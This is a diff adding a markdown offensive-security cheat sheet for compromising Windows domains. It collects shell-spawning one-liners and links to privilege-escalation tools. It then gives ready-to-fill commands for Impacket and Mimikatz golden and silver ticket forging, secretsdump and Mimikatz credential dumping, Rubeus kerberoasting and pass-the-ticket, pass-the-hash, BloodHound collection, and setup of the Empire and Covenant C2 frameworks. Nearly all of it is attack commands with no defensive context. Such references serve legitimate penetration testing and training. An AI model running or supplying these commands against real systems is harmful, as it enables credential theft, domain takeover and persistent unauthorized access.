@@ -1,0 +1,199 @@
+## Spawn a tty: 
+
+1. rlwrap nc localhost 80
+
+2. rlwrap -r -f . nc <IP ADDRESS> <PORT>
+
+- socat file:`tty`,raw,echo=0 tcp-listen:12345
+- /bin/sh -i
+- python -c 'import pty; pty.spawn("/bin/sh")'
+- perl -e 'exec "/bin/sh";'
+- perl: exec "/bin/sh";
+- ruby: exec "/bin/sh"
+- lua: os.execute('/bin/sh')
+
+## Priviledge Escalation Scripts:
+
+Windows:
+- Windows Exploit Suggester (Next-Generation): https://github.com/bitsadmin/wesng
+- Sherlock: https://github.com/rasta-mouse/Sherlock
+- Powersploit: https://github.com/PowerShellMafia/PowerSploit
+- WinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+
+Linux:
+- Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
+- LinEnum: https://github.com/rebootuser/LinEnum
+- UnixPriv Checker: https://github.com/pentestmonkey/unix-privesc-check
+- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+## Other Resources: 
+
+PowerSharpPack:
+- https://github.com/S3cur3Th1sSh1t/PowerSharpPack 
+
+Windows: 
+- LOLBAS: https://lolbas-project.github.io/#
+- Windows Privilege Escalation Fundmentals: https://www.fuzzysecurity.com/tutorials/16.html
+- SharpSuite: https://github.com/FuzzySecurity/Sharp-Suite
+- Watson: https://github.com/rasta-mouse/Watson
+- WinPwn: https://github.com/S3cur3Th1sSh1t/WinPwn
+
+Linux: 
+- GTFOBins: https://gtfobins.github.io/
+- g0tmi1k Linux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Impacket
+=====================================================================================================
+
+# Generate Silver Tickets with Impacket:
+- python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+- python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+
+# Generate Golden Tickets:
+- python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+- python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+
+# Credential Access with Secretsdump
+
+- impacket-secretsdump username@target-ip -dc-ip target-ip
+
+C2 Framework
+===========================================================================================================
+
+## Empire C2:
+
+Github: https://github.com/BC-SECURITY/Empire
+
+In Kali Linux: 
+
+apt install powershell-empire
+
+Install Empire Manually:
+
+1. cd /Empire/setup
+2. ./install.sh
+
+- Current Listeners: 
+
+(Empire) > listeners
+[!] No listeners currently active
+(Empire: listeners) > uselistener 
+dbx           http          http_com      http_foreign  http_hop      http_mapi     meterpreter   onedrive      redirector   
+
+
+## Covenant
+
+Source: https://github.com/cobbr/Covenant
+
+Installation on Kali: 
+
+1. apt install dotnet-sdk-2.2
+2. git clone --recurse-submodules https://github.com/cobbr/Covenant
+3. cd Covenant/Covenant
+4. dotnet build
+5. dotnet run
+
+BloodHound
+==================================================================================================================
+
+## Source: 
+
+https://github.com/BloodHoundAD/BloodHound
+
+## Pre-Compiled Binaries
+
+https://github.com/BloodHoundAD/BloodHound/releases
+
+## SharpHound: 
+
+https://github.com/BloodHoundAD/SharpHound3
+
+## Bloodhound for python 
+Note: Only compatiable with BloodHound 3.0 or newer
+
+https://github.com/fox-it/BloodHound.py
+
+
+## Gather Data
+
+- import-module .\sharphound.ps1
+- invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password
+
+Rubeus
+=========================================================================================
+
+# Source
+
+- https://github.com/GhostPack/Rubeus
+
+Review the opsec notes before compiling the program in visual studio. 
+
+## ASREProasting:
+
+chek for users in the current domain:
+
+- Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
+
+## Kerberoasting:
+
+- Rubeus.exe kerberoast /outfile:<output_TGSs_file>
+
+- Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 
+
+## Pass the key (PTK):
+
+- .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
+
+
+## Using the ticket on a Windows target: 
+
+- Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+
+Mimikatz
+===================================================================
+
+# Mimikatz
+
+Post exploitation commands must be executed from SYSTEM level privileges.
+- mimikatz # privilege::debug
+- mimikatz # token::whoami
+- mimikatz # token::elevate
+- mimikatz # lsadump::sam
+- mimikatz # sekurlsa::logonpasswords
+
+## Pass The Hash
+
+- mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
+
+## Inject generated TGS key
+
+- mimikatz # kerberos::ptt <ticket_kirbi_file>
+
+## Generating a silver ticket 
+
+AES 256 Key:
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+
+AES 128 Key:
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+
+NTLM:
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+
+
+## Generating a Golden Ticket
+
+AES 256 Key:
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
+
+AES 128 Key: 
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
+
+NTLM:
+
+- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
